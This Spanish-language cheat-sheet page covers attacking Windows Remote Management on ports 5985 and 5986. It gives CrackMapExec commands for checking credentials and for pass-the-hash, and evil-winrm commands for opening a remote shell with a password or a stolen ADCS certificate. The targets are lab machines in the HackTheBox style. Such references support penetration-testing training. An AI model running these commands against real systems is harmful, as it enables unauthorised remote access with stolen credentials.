---
id: winrm
title: WinRM - 5985,5986
---

WinRM (Windows Remote Management) es el servicio de administración remota de Windows basado en WS-Management. El puerto 5985 es HTTP y 5986 es HTTPS. Si un usuario pertenece al grupo **Remote Management Users**, puede obtener una shell interactiva en la máquina.

## CrackMapExec

Permite validar credenciales contra WinRM. Si aparece `Pwn3d!` en la salida, el usuario puede obtener shell.

```bash
crackmapexec winrm 10.10.10.161 -u 'user' -p 'pass'
```

Autenticación con hash NTLM (pass-the-hash):

```bash
crackmapexec winrm 10.10.10.161 -u 'user' -H 'ntlm_hash'
```

## evil-winrm

Shell interactiva de PowerShell sobre WinRM. Incluye funcionalidades extra como carga de scripts, DLLs y transferencia de archivos.

### Conexión con credenciales

```bash
evil-winrm -i 10.10.10.161 -u 'user' -p 'pass'
```

### Conexión con certificado

Conexión mediante certificado de cliente (TLS). Útil cuando se ha comprometido un certificado a través de ADCS u otro vector.

> El flag `-S` activa SSL (puerto 5986).

```bash
evil-winrm -i timelapse.htb -S -c certificate.pem -k priv-key.pem
```
